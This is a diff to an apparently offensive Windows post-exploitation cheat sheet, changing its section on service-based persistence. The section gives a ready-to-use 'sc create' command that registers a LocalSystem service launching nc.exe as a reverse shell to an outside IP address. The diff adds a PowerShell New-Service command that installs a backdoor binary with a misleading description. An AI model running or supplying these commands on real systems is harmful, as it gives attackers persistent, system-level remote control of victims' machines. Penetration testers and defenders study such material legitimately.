@@ -742,10 +742,14 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr
 wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" |findstr /i /v """
 ```
 
-### Creating Persistence
+### Persistence via Services
 
 ```csharp
+# cmd
 sc create spotlessSrv binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""
+
+# powersehll
+New-Service -Name EvilName -DisplayName EvilSvc -BinaryPathName "'C:\Program Files\NotEvil\back.exe'" -Description "Not at all"
 ```
 
 ### Port Forwarding / SSH Tunneling
